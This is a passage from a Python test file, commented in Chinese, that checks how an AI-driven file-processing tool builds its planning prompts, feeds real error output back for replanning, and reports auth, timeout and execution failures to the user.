    s.truthy("含绝对输入路径", "/abs/in/src.jpg" in prompt)
    s.truthy("含输出目录", "/abs/out" in prompt)
    s.truthy("含占位符替换警告", "$OUTPUT_DIR" in prompt)
    s.truthy("带内部会话标记", fp.INTERNAL_MARKER in prompt)

    repair = fp.build_plan_prompt(["/abs/in/src.jpg"], "/abs/out", "压缩一下",
                                  {"cmd": "convert bad", "stderr": "boom"})
    s.truthy("重规划带错误回喂", "boom" in repair and "执行失败" in repair)


def test_orchestration(s):
    if not (_has("convert") or _has("magick")):
        s.section("编排循环（跳过：未安装 ImageMagick）")
        return

    tool = "magick" if _has("magick") else "convert"
    work = tempfile.mkdtemp()
    original_call_agy = fp.call_agy
    try:
        win, wout = os.path.join(work, "in"), os.path.join(work, "out")
        os.makedirs(win)
        os.makedirs(wout)
        _make_image(f"{win}/01_a.jpg")
        _make_image(f"{win}/02_b.jpg", gradient="green-black")

        s.section("失败 → 回喂真实 stderr → 重规划 → 成功")
        calls = []

        def stub(prompt, model, timeout):
            calls.append(prompt)
            if len(calls) == 1:
                return True, f'<json>["{tool} /nope/x.jpg {wout}/o.jpg"]</json>', None
            s.truthy("重规划 prompt 含回喂段落", "上一轮规划执行失败" in prompt)
            s.truthy("重规划 prompt 含真实 stderr", "nope" in prompt)
            return True, (f'<json>["{tool} {win}/01_a.jpg {win}/02_b.jpg '
                          f'-resize 300x -append {wout}/stitched.jpg"]</json>'), None

        fp.call_agy = stub
        steps = []
        ok, products, err = fp.plan_and_execute(
            [f"{win}/01_a.jpg", f"{win}/02_b.jpg"], win, wout, "拼成长图", "m", steps.append)
        s.check("规划轮数", len(calls), 2)
        s.check("最终成功", ok, True)
        s.check("产出 1 个文件", len(products), 1)
        s.truthy("状态播报含重规划提示", any("重新规划" in x for x in steps))

        s.section("彻底失败时用户可见真实错因")
        fp.call_agy = lambda p, m, t: (True, f'<json>["{tool} /nope/x.jpg {wout}/o.jpg"]</json>', None)
        ok, _, err = fp.plan_and_execute([f"{win}/01_a.jpg"], win, wout, "压缩", "m")
        s.check("失败", ok, False)
        s.truthy("错误含真实 stderr", "nope" in err)
        s.check("HTML 已转义", "<pre>" in err and "&lt;" not in err.split("<pre>")[0], True)

        s.section("认证失效不得伪装成格式错误")
        fp.call_agy = lambda p, m, t: (False, "", "auth")
        ok, _, err = fp.plan_and_execute([f"{win}/01_a.jpg"], win, wout, "压缩", "m")
        s.check("失败", ok, False)
        s.truthy("提示认证问题", "认证" in err)

        s.section("规划超时归因正确")
        fp.call_agy = lambda p, m, t: (False, "", "timeout")
        ok, _, err = fp.plan_and_execute([f"{win}/01_a.jpg"], win, wout, "压缩", "m")
        s.truthy("提示超时", "超时" in err)
    finally:
        fp.call_agy = original_call_agy
        shutil.rmtree(work, ignore_errors=True)


SUITES = [
    ("文件名注入防护", test_filename_injection),
    ("意图判定", test_intent_shortcircuit),
    ("菜谱选取", test_recipe_selection),
    ("PDF 菜谱路由", test_pdf_recipe_routing),
    ("图片转PDF路由", test_image_to_pdf_routing),
    ("视频剪辑路由", test_video_trim_routing),
    ("视频压缩路由", test_video_compression_routing),
    ("语音类意图", test_speech_media_intent),
    ("拒绝通道", test_rejection_channel),
    ("文档转换边界", test_document_convert_boundaries),
    ("Office 转换菜谱", test_office_convert_recipe),
    ("文本产物内联", test_inline_text_products),
    ("压缩菜谱要点", test_video_compression_recipe_params),
    ("码率探针", test_probe_reports_bitrate),
    ("剪辑菜谱要点", test_video_trim_recipe_params),
    ("菜谱选取精度", test_recipe_selection_precision),
    ("产物打包", test_product_packaging),
    ("工具链裁剪", test_toolchain_trim),
    ("命令提取", test_command_extraction),
    ("执行层", test_execution_layer),
    ("失衡判据", test_disproportionate_detection),
    ("产物体积回喂", test_oversized_product_feedback),
    ("Prompt 组装", test_plan_prompt),
    ("编排循环", test_orchestration),
]

if __name__ == "__main__":
    main(SUITES)
